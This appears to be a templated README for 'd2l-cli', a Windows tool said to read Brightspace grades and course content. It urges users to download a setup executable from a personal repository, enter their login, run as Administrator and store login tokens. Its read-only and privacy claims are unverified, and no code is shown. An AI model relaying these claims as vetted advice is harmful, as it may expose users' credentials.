# 📥 d2l-cli - Simple Tool for Brightspace Data Access

[![Download d2l-cli](https://img.shields.io/badge/Download-d2l--cli-orange?style=for-the-badge)](https://github.com/clintonwrong53/d2l-cli)

---

## 📋 What is d2l-cli?

d2l-cli is a command-line tool to access information from D2L Brightspace, a popular learning management system. It lets you pull grades, assignments, course content, syllabi, and more. This tool reads data only; it does not change or upload anything. It was built to help automation agents like Claude Code and OpenClaw use Brightspace data easily.

This app runs on Windows and needs no programming skills to use. You will learn how to download it, get it running, and use it step by step.

---

## 🖥️ System Requirements

Before you start, make sure your Windows PC meets these requirements:

- Windows 10 or newer
- At least 4 GB of RAM
- 200 MB of free disk space
- An internet connection
- Basic keyboard and mouse use

d2l-cli runs in a command prompt window. You won’t need extra software or complex setup.

---

## 🔥 Key Features

- Get grades from your Brightspace courses.
- List assignments and due dates.
- Download course content and syllabi.
- Designed to work smoothly with AI agents and scripts.
- Easy to use with simple commands.
- Secure read-only access to your data.

---

## 🚀 Getting Started: Download and Install

1. Visit this page to download d2l-cli:  
   [Download d2l-cli from GitHub](https://github.com/clintonwrong53/d2l-cli)

2. After opening the page, look for the latest release or download area.

3. Download the Windows installer file ("d2l-cli-setup.exe" or similar).

4. Once the file finishes downloading, locate it in your Downloads folder.

5. Double-click the installer file to start setup.

6. Follow the on-screen setup instructions:

   - Accept the license agreement.
   - Choose the install location (the default is fine).
   - Click “Install.”

7. When installation completes, you can close the setup window.

---

## 💻 Running d2l-cli for the First Time

1. Open the Start menu and search for **Command Prompt**. Click to open it.

2. Type the command below and press Enter:

   ```
   d2l-cli --help
   ```

3. This will show a list of commands and options you can use with d2l-cli.

4. To see your grades, for example, you might run:

   ```
   d2l-cli grades
   ```

5. If this is your first time running d2l-cli, it will ask you to log in to your Brightspace account. Follow the instructions to enter your credentials safely.

---

## 📂 How d2l-cli Works (Simple Explanation)

d2l-cli connects to your Brightspace account using your login information. It then reads data like your grades, assignments, and course files. It downloads this data to your PC in a format you can view or use with other programs.

You only need to run a simple command in the command prompt window, and the tool does the rest. You don’t have to understand programming or coding to use it.

---

## 🛠 Basic Commands

Here are some commands you may use often. Type these commands in the Command Prompt after installing:

- `d2l-cli grades` — Shows your grades.
- `d2l-cli assignments` — Lists your assignments.
- `d2l-cli content` — Downloads course content.
- `d2l-cli syllabus` — Downloads your syllabi.

To get help anytime, type:

```
d2l-cli --help
```

---

## 🔐 Safety and Privacy

d2l-cli does not change anything in your account. It only reads data to show you what is already there. You enter your login only once per session. Your information is stored securely on your computer and not sent to outside servers.

---

## ❓ Troubleshooting Tips

- If d2l-cli does not start, make sure you installed it correctly.
- Run Command Prompt as Administrator if you see permission errors.
- Check your internet connection; d2l-cli needs to connect to Brightspace servers.
- If login fails, verify your username and password.
- Close Command Prompt and reopen it if commands don't work.
- Always use the latest version by checking the download page.

---

## 📥 Download d2l-cli

Download the latest version from GitHub here:

[![Download d2l-cli](https://img.shields.io/badge/Download-d2l--cli-blue?style=for-the-badge)](https://github.com/clintonwrong53/d2l-cli)

Click the link, find the setup file, download, and follow the install steps above.

---

## ⚙️ Additional Settings (Optional)

You can customize d2l-cli with simple config files stored in your Documents folder. These files let you choose:

- Default courses to pull data from.
- File formats for downloaded content.
- Automated login tokens.

These features are for users who want to automate tasks or use d2l-cli regularly.

---

## 📚 Getting Help and Support

If you have questions, use the `--help` command in Command Prompt:

```
d2l-cli --help
```

You can also visit the Issues section on the GitHub page for common questions or to report problems:

https://github.com/clintonwrong53/d2l-cli/issues

---

## 🧰 Technical Info (For Reference)

- d2l-cli uses Brightspace’s official API to access your data.
- It requires internet access to connect securely to Brightspace.
- The tool works on Windows 10 and later versions.
- It uses simple commands and outputs text or files you can open on your PC.

---

This guide should help you download, install, and start using d2l-cli on your Windows PC. Follow each step carefully to get the tool up and running with ease.